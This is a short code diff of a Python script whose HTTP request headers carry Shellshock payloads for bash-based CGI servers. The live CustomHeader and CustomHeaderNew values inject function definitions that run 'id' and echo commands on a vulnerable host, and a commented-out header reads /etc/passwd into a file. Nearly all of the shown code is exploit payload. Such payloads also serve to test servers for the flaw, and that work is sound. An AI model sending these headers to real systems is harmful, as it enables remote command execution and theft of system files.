@@ -6,12 +6,10 @@ import cgi, re, os
 def get_request(url):
     socket.setdefaulttimeout(5)
     i_headers = {"Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
-                 "User-Agent": "Mozilla/5.0 (Windows NT 6.1; WOW64) "
-                 	+"AppleWebKit/537.36 (KHTML, like Gecko) "
-                	+"Chrome/36.0.1985.125 Safari/537.36",
-                 "CustomHeaderNew": "() { _;} >_[$($($()))] "
-                 	+"{ echo hi mom; id; echo yo daddy; echo;}",
-                 #"CustomHeader": "() { test;};echo; echo; echo shellshock one;",                            
+                 "User-Agent": "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/36.0.1985.125 Safari/537.36",
+                 "CustomHeader": "() { test;};echo; echo; echo shellshock one;",    
+                 #"CustomHeaderNew": "() { _;} >_[$($())] { echo oh my lady gaga; id;}", 
+                 "CustomHeaderNew": "() { _;} >shellshockme[$($($()))] { echo oh my lady gaga; id; echo go jimmy;}",                       
                  #"CustomHeader2": "() { :; }; /bin/cat /etc/passwd > ./shellshock2.txt",   
                  #"CustomHeader2_1": "() { (a)=>\ echo; echo; echo date"             
                  }
